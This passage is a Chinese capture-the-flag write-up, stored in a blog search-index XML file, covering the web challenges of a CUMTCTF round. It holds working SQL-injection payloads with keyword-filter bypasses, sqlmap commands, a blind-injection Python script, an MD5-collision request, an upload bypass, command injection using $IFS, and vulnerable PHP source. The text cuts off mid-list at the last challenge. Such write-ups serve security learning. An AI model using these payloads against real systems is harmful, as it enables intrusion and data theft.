<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[CUMTCTF第二轮月赛]]></title>
      <url>/2019/01/30/cumtctf2/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。</p>
<a id="more"></a>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$white_list = range(<span class="number">0</span>,<span class="number">9</span>); </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver2'</span>]))&#123; </span><br><span class="line">    $a = $_REQUEST[<span class="string">'0ver'</span>]; </span><br><span class="line">    $b = $_REQUEST[<span class="string">'0ver1'</span>]; </span><br><span class="line">    $c = $_REQUEST[<span class="string">'0ver2'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(@ereg(<span class="string">"^[0-9]+$"</span>, $a) === <span class="keyword">FALSE</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no must be number'</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($a,$white_list))&#123; </span><br><span class="line">            <span class="keyword">if</span>(strlen($a)&gt;<span class="number">1</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;img src='dark.png'&gt;&lt;br&gt;"</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'you are a great dark phper&lt;br&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span>&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"you can do it!!!"</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                 </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'you no dark'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'you are so dark'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 <code>03</code>类似的即可绕过，也可以使用<code>%00</code>截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可</p>
<p>paylaod：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http:<span class="regexp">//</span><span class="number">202.119</span>.<span class="number">201.199</span>:<span class="number">32790</span>?0ver=<span class="number">02</span> --data <span class="string">"0ver1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"</span></span><br></pre></td></tr></table></figure>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:flag&#123;<span class="number">73100259</span>ca8919f402846b00d<span class="number">3b939a9</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h2><p>查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。</p>
<p>这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。</p>
<p><img src="https://i.imgur.com/kDxBrxT.png" alt="">    </p>
<h2 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h2><p>题目提示了断电，应该是vi文件泄露，测试发现 <code>.index.swp</code>存在泄露，vim恢复一下</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vi</span> -r <span class="built_in">index</span>.swp</span><br></pre></td></tr></table></figure>
<p>代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $invest = $_GET[<span class="string">'invest'</span>];</span><br><span class="line">    $rand = rand(<span class="number">2</span>,<span class="number">50</span>);</span><br><span class="line">    $len = strlen(trim($_GET[<span class="string">'invest'</span>]));</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $money = number_format($invest*$rand);</span><br><span class="line">    $money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">    $guess = intval($_GET[<span class="string">'guess'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码思路是提交invest值，然后乘以一个2-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag</p>
<p><img src="https://i.loli.net/2019/01/24/5c49424c2fdc8.png" alt="抓包爆破"></p>
<p><img src="https://i.loli.net/2019/01/24/5c4942d3766a8.png" alt="flag"></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">7e1</span>e<span class="number">2</span>bfe<span class="number">75</span><span class="keyword">c</span><span class="number">980</span>be<span class="number">35</span><span class="keyword">c</span><span class="number">61</span>ed<span class="number">1</span>bde<span class="number">7</span>a<span class="number">6</span>f<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> http://bxs.cumt.edu.<span class="keyword">cn</span>:<span class="number">30007</span>/test/<span class="built_in">index</span>.php?id=<span class="number">1</span> --dbs</span><br></pre></td></tr></table></figure>
<p>数据库名为security</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> http://bxs.cumt.edu.<span class="keyword">cn</span>:<span class="number">30007</span>/test/<span class="built_in">index</span>.php?id=<span class="number">1</span> -D security --tables</span><br></pre></td></tr></table></figure>
<p>表名flagishere</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> http://bxs.cumt.edu.<span class="keyword">cn</span>:<span class="number">30007</span>/test/<span class="built_in">index</span>.php?id=<span class="number">1</span> -D security -T flagishere --columns --threads=<span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>列名id,flag</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> http://bxs.cumt.edu.<span class="keyword">cn</span>:<span class="number">30007</span>/test/<span class="built_in">index</span>.php?id=<span class="number">1</span> -D security -T flagishere -C <span class="string">"id,flag"</span> --dump --threads=<span class="number">10</span></span><br></pre></td></tr></table></figure>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">4</span>ur0R<span class="built_in">a_SimPlE</span>_sQLi_23333&#125;</span><br></pre></td></tr></table></figure>
<h2 id="真的简单。。"><a href="#真的简单。。" class="headerlink" title="真的简单。。"></a>真的简单。。</h2><p>随手fuzz一下</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//202.119.201.199:32793/list.php?id=1%27</span></span><br></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//202.119.201.199:32793/list.php?id=1%27--+</span></span><br></pre></td></tr></table></figure>
<p>可以正常返回，猜测是单引号注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">202.119</span>.<span class="number">201.199</span>:<span class="number">32793</span>/list.php?id=<span class="number">-1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%201</span>=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure>
<p>无正确回显，猜测可能是or有问题，换 <code>||</code> 试一下</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">202.119</span><span class="number">.201</span><span class="number">.199</span>:<span class="number">32793</span>/list.php?id=<span class="number">-2</span>%<span class="number">27</span> || <span class="number">3</span>=<span class="built_in">length</span>(database())<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>果然返回正确，数据库长度为3</p>
<p>题目过滤了or，但是可以绕过</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://202.119.201.199:32793/list.php?id=-1<span class="number">%27</span><span class="number">%20</span>oorr<span class="number">%201</span>=1--+</span><br></pre></td></tr></table></figure>
<p>爆列数</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">202.119</span><span class="number">.201</span><span class="number">.199</span>:<span class="number">32793</span>/list.php?id=<span class="number">-2</span>%<span class="number">27</span> || <span class="number">3</span>=<span class="number">3</span> oorrder <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>共有三列</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,database(),3--+</span></span><br></pre></td></tr></table></figure>
<p>database:ctf</p>
<p>接下来就是常规的注入了</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">202.119</span><span class="number">.201</span><span class="number">.199</span>:<span class="number">32793</span>/list.php?id=<span class="number">-2</span>%<span class="number">27</span> || <span class="number">3</span>=<span class="number">2</span> ununionion selselectect <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="built_in">from</span> infoorrmation_schema.tables where table_schema=database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>table：ctf,flag </p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">202.119</span><span class="number">.201</span><span class="number">.199</span>:<span class="number">32793</span>/list.php?id=<span class="number">-2</span>%<span class="number">27</span> || <span class="number">3</span>=<span class="number">2</span> ununionion selselectect <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="built_in">from</span> infoorrmation_schema.columns where table_schema=database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>列名：id,flag </p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">202.119</span><span class="number">.201</span><span class="number">.199</span>:<span class="number">32793</span>/list.php?id=<span class="number">-2</span>%<span class="number">27</span> || <span class="number">3</span>=<span class="number">2</span> ununionion selselectect <span class="number">1</span>,flag,<span class="number">3</span> <span class="built_in">from</span> flag<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>居然还有题目..</p>
<blockquote>
<p>flag in admin_08163314/exec.php </p>
</blockquote>
<p>访问一下，是个命令执行界面，过滤了空格，可用<code>$IFS</code>绕过，尝试列根目录但是失败了，猜测可能是<code>/</code>被过滤了，但是 <code>* .</code>没有被过滤，可以用来读文件exec.php</p>
<p><img src="https://i.loli.net/2019/01/26/5c4c5df37356a.png" alt=""></p>
<p>可以得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">	$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">	$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">	system($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录</p>
<p><img src="https://i.loli.net/2019/01/26/5c4c5e68be087.png" alt=""></p>
<p><img src="https://i.loli.net/2019/01/26/5c4c5e99549bc.png" alt=""></p>
<p>注意这里的flag_3314是个目录，还得继续列目录</p>
<p><img src="https://i.loli.net/2019/01/26/5c4c5eea0c492.png" alt=""></p>
<p><img src="https://i.loli.net/2019/01/26/5c4c5f1453698.png" alt=""></p>
<p><img src="https://i.loli.net/2019/01/26/5c4c5f7396879.png" alt=""></p>
<p><img src="https://i.loli.net/2019/01/26/5c4c5f7398de3.png" alt=""></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">3570</span>d<span class="number">4</span>d<span class="number">9</span><span class="keyword">c</span><span class="number">72</span>a<span class="number">19</span><span class="keyword">c</span><span class="number">889140674827</span>eeca<span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SimpleSQLi2"><a href="#SimpleSQLi2" class="headerlink" title="SimpleSQLi2"></a>SimpleSQLi2</h2><p>fuzz测试了一下感觉是数字型注入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://bxs.cumt.edu.cn:30010/test/index.php?id=-1<span class="number">%20</span>||<span class="number">%201</span>=1</span><br></pre></td></tr></table></figure>
<p>接下来测试过滤规则</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bxs.cumt.edu.cn:<span class="number">30010</span><span class="regexp">/test/i</span>ndex.php?id=<span class="number">2</span>&gt;<span class="number">2</span> || length(<span class="string">'seleselectct'</span>)=<span class="number">6</span></span><br></pre></td></tr></table></figure>
<p>测试发现过滤了 <code>select,or,空格</code>，空格可用<code>/**/</code>绕过，select等可双写绕过，接下来只需要编写盲注脚本即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words = <span class="string">"2019~"</span></span><br><span class="line">url = <span class="string">"http://bxs.cumt.edu.cn:30010/test/index.php?id="</span></span><br><span class="line">table = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># emails,flagishere,referers,uagents,users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># Id,flag</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">128</span>):</span><br><span class="line">		res = requests.get(url+payload.format(j,i)).text</span><br><span class="line">		<span class="keyword">if</span> words <span class="keyword">in</span> res:</span><br><span class="line">			table += chr(i)</span><br><span class="line">			print(table)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>可以得到flag如下</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;4nother_SimPLE_SQLi_0rek1&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<p>后来和出题人交流了一下，思路非预期2333~</p>
<h2 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h2><p>网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个<code>xxxx.jpg</code>，然后修改文件名，通过修改文件名为 <code>xxxx.php%00.jpg</code> 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码<code>www.zip</code></p>
<p>核心代码如下</p>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">        $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];       </span><br><span class="line">        $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line">        $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $file["tmp_name"], ROOT . UPLOAD_DIR . $name;</span></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">            $re = $db-&gt;query($sql);</span><br><span class="line">            <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">                print_r($db-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r(error_get_last());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">rename.php</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">        $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            print_r($db-&gt;errorInfo());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">            rename($oldname, $newname);</span><br><span class="line">            $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 <a href="http://drops.xmd5.com/static/drops/tips-10564.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-10564.html</a>，而且还给出了攻击流程，本题是个二次注入。</p>
<p>题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下</p>
<ol>
